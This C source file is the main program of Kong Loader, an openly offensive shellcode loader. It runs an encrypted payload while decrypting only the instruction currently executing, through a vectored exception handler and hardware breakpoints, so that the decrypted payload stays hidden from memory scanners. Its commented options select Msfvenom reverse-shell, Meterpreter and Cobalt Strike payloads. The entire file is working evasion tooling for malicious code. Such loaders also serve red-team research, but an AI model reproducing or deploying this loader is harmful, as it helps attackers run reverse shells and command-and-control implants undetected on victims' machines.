/**
 * Mozilla Public License (MPL) Version 2.0.
 * 
 * Copyright (c) 2024 Tijme Gommers (@tijme).
 * 
 * This source code file is part of Kong Loader. Kong Loader is 
 * licensed under Mozilla Public License (MPL) Version 2.0, and 
 * you are free to use, modify, and distribute this file under 
 * its terms. However, any modified versions of this file must 
 * include this same license and copyright notice.
 */

/**
 * Standard Input Output.
 * 
 * Defines three variable types, several macros, and various functions for performing input and output.
 * https://www.tutorialspoint.com/c_standard_library/stdio_h.htm
 */
#include <stdio.h>

/**
 * Standard Library.
 * 
 * Defines four variable types, several macros, and various functions for performing general functions.
 * https://www.tutorialspoint.com/c_standard_library/stdlib_h.htm
 */
#include <stdlib.h>

/**
 * Integers.
 * 
 * Defines macros that specify limits of integer types corresponding to types defined in other standard headers.
 * https://pubs.opengroup.org/onlinepubs/009696899/basedefs/stdint.h.html
 */
#include <stdint.h>

/**
 * Booleans.
 * 
 * Defines boolean types.
 * https://pubs.opengroup.org/onlinepubs/007904975/basedefs/stdbool.h.html
 */
#include <stdbool.h>

/**
 * Windows API.
 * 
 * Contains declarations for all of the functions, macro's & data types in the Windows API.
 * https://docs.microsoft.com/en-us/previous-versions//aa383749(v=vs.85)?redirectedfrom=MSDN
 */
#include <windows.h>

/**
 * NT Definitions Header.
 * 
 * NTSTATUS type and status codes. Macros such as NT_SUCCESS, NT_ERROR, etc.
 * https://learn.microsoft.com/en-us/windows/win32/api/ntdef/
 */
#include <ntdef.h>

/**
 * Include Zydis.
 * 
 * Fast and lightweight x86/x86-64 disassembler and code generation library.
 * https://github.com/zyantific/zydis
 */
#include "../lib/Zydis.c"

/**
 * Global definitions
 */
#define ENABLE_VERBOSE_PRINT_STATEMENTS 0x1 // Verbose printing (if positive)

/**
 * Include shellcode.
 * 
 * Our custom shellcode is loaded from `Shellcode.c` for easy adjustability.
 */
#include "shellcode/Custom-Storage-1.c" // Working
// #include "shellcode/Custom-ArgumentOnStack-1.c" // Working
// #include "shellcode/Custom-AccessViolation-1.c" // Working
// #include "shellcode/Custom-ArgumentAsString-1.c" // Working
// #include "shellcode/Custom-KitchenSink-1.c" // Working
// #include "shellcode/Custom-Multiply-1.c" // Working
// #include "shellcode/Msfvenom-WinExec-1.c" // Working
// #include "shellcode/Msfvenom-ShellReverseTCP-1.c" // Working? (from C:\ drive)
// #include "shellcode/Msfvenom-MeterpreterReverseTCP-2.c" // Working
// #include "shellcode/Msfvenom-MeterpreterReverseTCP-1.c" // Not working
// #include "shellcode/Proprietary-CobaltStrike-StagelessHTTP-1.c" // Not working
// #include "shellcode/Donut-MessageBoxA-1.c" // Not working

/**
 * Custom helper functions that do not use global variables
 */
#include "helpers/ConsoleHelper.c"
#include "helpers/CentralProcessingUnitHelper.c"
#include "helpers/MaliciousMemoryHelper.c"

/**
 * Global variables
 */
static struct PayloadDescriptor lpPD;
static ZydisDecoder* lpZydisDecoder = NULL;
static ZydisFormatter* lpZydisFormatter = NULL;
static HANDLE hCurrentThread = NULL;
static LPVOID lpExceptionHandler = NULL;

/**
 * Custom helper functions that use global variables
 */
#include "helpers/ZydisHelper.c"

/**
 * The excetion/instruction handler being executed for every single instruction in the payload.
 * 
 * This function must be as fast as possible as it will run for *every* single instruction.
 * 
 * @param PEXCEPTION_POINTERS lpException Contains the exception record.
 * @return LONG The action to perform after this exception.
 */
LONG ExceptionHandler(PEXCEPTION_POINTERS lpException) {
    // PRINT_VERBOSE("Received exception. Now in exception handler.");
    // printf("[SUCCESS] Current payload:   "); PrintInHex(lpPD.lpPayload, lpPD.dwPayloadSize, false);

    // Local variables
    ZydisDecodedInstruction zdInstruction;
    ZydisDecodedOperand zdOperands[ZYDIS_MAX_OPERAND_COUNT];
    PEXCEPTION_RECORD lpRecord = lpException->ExceptionRecord;
    PCONTEXT lpContext = lpException->ContextRecord;
    uint8_t* lpCurrentAddress = (uint8_t*) lpContext->Rip;
    uint64_t lpCurrentAddressLength = 0;

    // Ensure that the exception type is correct
    if (lpRecord->ExceptionCode != EXCEPTION_SINGLE_STEP) {
        PRINT_WARNING("Unknown exception code 0x%X.", lpRecord->ExceptionCode);
        Decrypt(&lpPD, lpCurrentAddress - lpPD.lpPayload, 16, true);
        ZydisDecoderDecodeFull(lpZydisDecoder, lpCurrentAddress, 16, &zdInstruction, zdOperands);
        PrintInstructionInformation(&zdInstruction, zdOperands, lpCurrentAddress);
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // Encrypt all decrypted bytes again
    Encrypt(&lpPD, 0x0, lpPD.dwPayloadSize, true);
    // printf("[VERBOSE] Encrypted payload: "); PrintInHex(lpPD.lpPayload, lpPD.dwPayloadSize, false);

    // Decrypt 16 bytes, required to decode the instruction
    Decrypt(&lpPD, lpCurrentAddress - lpPD.lpPayload, 16, false);
    // printf("[SUCCESS] 16 decryp payload: "); PrintInHex(lpPD.lpPayload, lpPD.dwPayloadSize, false);

    // Decode the instruction
    if (!ZYAN_SUCCESS(ZydisDecoderDecodeFull(lpZydisDecoder, lpCurrentAddress, 16, &zdInstruction, zdOperands))) {
        PRINT_FAILURE_AND_ABORT("Could not decode instruction 0x%X at 0x%p", *lpCurrentAddress, lpCurrentAddress);
    }

    // Encrypt the 16 bytes that were required to decode the instruction
    // Afterwards decrypt the correct amount of bytes (size of instruction)
    Encrypt(&lpPD, lpCurrentAddress - lpPD.lpPayload, 16, false);
    Decrypt(&lpPD, lpCurrentAddress - lpPD.lpPayload, zdInstruction.length, false);
    SetByteType(&lpPD, lpCurrentAddress - lpPD.lpPayload, zdInstruction.length, BYTE_TYPE_PART_OF_INSTRUCTION);

    // Debug statement
    // PrintInstructionInformation(&zdInstruction, zdOperands, lpCurrentAddress);

    // Enrich the byte descriptor of the current instruction address
    EnrichByteDescriptor(&zdInstruction, zdOperands, lpException, lpCurrentAddress);
    struct ByteDescriptor lpCurrentBDL = lpPD.lpBDL[lpCurrentAddress - lpPD.lpPayload];

    // Perform any instruction actions that need to be carried out. For example, if 
    // certain data stored in the shellcode itself is referenced, it should be decrypted
    for (size_t i = 0; i < MAX_INSTRUCTION_ACTIONS_PER_BYTE; i++) {
        switch (lpCurrentBDL.sInstructionActions[i].eDesiredState) {
            case DESIRED_STATE_ENCRYPTED:
                PRINT_FAILURE_AND_ABORT("Encountered a desired state (`DESIRED_STATE_ENCRYPTED`) that is not implemented in ExceptionHandler.");
                break;
            case DESIRED_STATE_DECRYPTED:
                Decrypt(&lpPD, lpCurrentBDL.sInstructionActions[i].lpAddress - lpPD.lpPayload, lpCurrentBDL.sInstructionActions[i].dwSize, false);
                break;
            case DESIRED_STATE_UNDEFINED:
            default:
                continue;
        }
    }

    // Clear the current breakpoint, and set a next one if the next breakpoint address would be within our shellcode
    if (IsAddressWithinBounds(&lpPD, lpCurrentBDL.lpLastKnownNextBreakpointAddress)) {
        SetBreakpoint(lpContext, lpCurrentBDL.lpLastKnownNextBreakpointAddress);
    } else {
        PRINT_SUCCESS("Next instruction 0x%p not within malicious memory bounds.", lpCurrentBDL.lpLastKnownNextBreakpointAddress);
        PRINT_SUCCESS("Clearing breakpoints and returning from malicious shellcode.");
        SetBreakpoint(lpContext, NULL);
    }

    // Continue execution, ignore any other breakpoints
    return EXCEPTION_CONTINUE_EXECUTION;
}

/**
 * Instruct KongLoader to run the shellcode in this file.
 *
 * @param int argc Amount of arguments in argv.
 * @param char** Array of arguments passed to the program.
 */
void main(int argc, char** argv) {
    // Initialize variables
    DWORD dwResult;
    
    // Print banner
    PrintBanner();

    // Create byte descriptor list (BDL)
    PRINT_SUCCESS("Creating Payload Descriptor (PD) and the `%s` payload within it.", STATIC_SHELLCODE_NAME);
    if (NT_SUCCESS(dwResult = CreatePayloadAndDescriptor((uint8_t*) &StaticShellcode, sizeof(StaticShellcode), (uint8_t*) &StaticPassword, sizeof(StaticPassword), STATIC_SHELLCODE_IS_ALREADY_ENCRYPTED, &lpPD))) {
        PRINT_SUCCESS("Succesfully created the Payload Descriptor (PD) with a size of %d bytes.", lpPD.dwPayloadSize);
        PRINT_SUCCESS("Base address of payload is %p.", lpPD.lpPayload);
    } else {
        PRINT_FAILURE_AND_ABORT("Could not create the Payload Descriptor (PD) and the payload within it: 0x%X.", dwResult);
    }

    // Encrypt shellcode if it is not encrypted yet.
    // Must only be the case for debugging purposes.
    if (!STATIC_SHELLCODE_IS_ALREADY_ENCRYPTED) {
        ToggleEncryption(&lpPD, 0x0, lpPD.dwPayloadSize); 
        PRINT_WARNING("Provided shellcode is not encrypted. This may only be the case for debugging purposes.");
        PRINT_WARNING("Encrypting the entire shellcode, for you to test in Kong Loader.");
    }

    // Configure the vectored exception handler
    lpExceptionHandler = AddVectoredExceptionHandler(1, ExceptionHandler);
    if (lpExceptionHandler == NULL) {
        PRINT_FAILURE_AND_ABORT("Failed to configure vectored exception handler.");
    }

    // Initialize the Zydis decoder
    lpZydisDecoder = calloc(1, sizeof(ZydisDecoder));
    if (!ZYAN_SUCCESS(ZydisDecoderInit(lpZydisDecoder, ZYDIS_MACHINE_MODE_LONG_64, ZYDIS_STACK_WIDTH_64))) {
        PRINT_FAILURE_AND_ABORT("Could not initialise Zydis decoder.");
    }

    // Initialize the Zydis formatter
    lpZydisFormatter = calloc(1, sizeof(ZydisFormatter));
    if (!ZYAN_SUCCESS(ZydisFormatterInit(lpZydisFormatter, ZYDIS_FORMATTER_STYLE_INTEL))) {
        PRINT_FAILURE_AND_ABORT("Could not initialise Zydis formatter.");
    }

    // Get thread & thread context
    hCurrentThread = GetCurrentThread();
    CONTEXT cDebugContext = { 0 };
    cDebugContext.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext(hCurrentThread, &cDebugContext)) {
        PRINT_FAILURE_AND_ABORT("Could not retrieve current thread context.");
    }
    
    // Set breakpoint on first malicious instruction
    SetBreakpoint(&cDebugContext, lpPD.lpPayload);
    SetThreadContext(hCurrentThread, &cDebugContext);

    // Call first malicious instruction
    PRINT_SUCCESS("Calling shellcode. This can take a while.");
    #if STATIC_SHELLCODE_HAS_RETURN_VALUE
        uint8_t* lpResult = ((runnableAndReturn) lpPD.lpPayload)();
        PRINT_SUCCESS("Shellcode returned value: 0x%08X.", lpResult);
    #else
        ((runnable) lpPD.lpPayload)();
        PRINT_SUCCESS("Shellcode did not return a value.");
    #endif
    
    // Remove the configured exception handler
    RemoveVectoredExceptionHandler(lpExceptionHandler);

    // Finished
    PRINT_SUCCESS("Successfully finished execution of the shellcode.\n");
}